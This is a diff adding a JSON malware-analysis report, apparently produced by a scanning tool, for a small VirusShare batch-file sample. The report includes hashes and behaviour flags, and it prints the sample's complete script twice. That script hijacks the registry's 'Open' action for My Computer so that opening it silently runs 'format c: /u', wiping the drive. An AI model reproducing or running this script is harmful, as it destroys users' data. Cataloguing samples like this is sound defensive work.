@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Open": "May open a file",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "@ctty nul\nset reg=c:\\ZeBumb.reg\necho>%reg% REGEDIT4\necho.>>%reg%\necho>>%reg% [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\Open]\necho.>>%reg%\necho>>%reg% [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\Open\\Command]\necho>>%reg% @=\"start /minimized command /c echo y|format c: /u >nul\"\necho.>>%reg%\nregedit.exe %reg%"
+    },
+    "filename": "VirusShare_32b6c68c3369fea55bded6810ef06480",
+    "filesize": 406,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "32b6c68c3369fea55bded6810ef06480",
+        "sha1": "f0ccd8081657028e7d3d19b620a4239b809c6200",
+        "sha256": "1d75f1214f9adf793c09b2a32160881f83495fe6e142b137c9dce00817c42b99"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul",
+            "set reg=c:\\ZeBumb.reg",
+            "echo>%reg% REGEDIT4",
+            "echo.>>%reg%",
+            "echo>>%reg% [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\Open]",
+            "echo.>>%reg%",
+            "echo>>%reg% [HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell\\Open\\Command]",
+            "echo>>%reg% @=\"start /minimized command /c echo y|format c: /u >nul\"",
+            "echo.>>%reg%",
+            "regedit.exe %reg%"
+        ],
+        "file": {
+            "set reg=c:\\ZeBumb.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.302175",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
